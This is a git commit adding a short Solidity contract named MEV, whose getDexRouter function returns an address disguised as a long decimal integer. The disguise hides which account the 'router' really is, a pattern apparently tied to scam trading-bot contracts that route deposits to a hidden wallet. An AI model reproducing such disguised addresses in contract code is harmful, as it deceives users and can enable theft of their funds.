918f102b64f6cc50f72636cf9f66a4775a79f8c0
Gobinda Paul <80039050+Gobindapaull@users.noreply.github.com>
2025-06-03 23:10:53 +0530

    Create dexRouter.sol

---
+++ MEV/dexRouter.sol
@@ -0,0 +1,8 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.30;
+
+contract MEV {
+    function getDexRouter()  public pure returns (address) {
+       return address(uint160(1044764381368598285108802008786265505841937801245));
+    }
+}
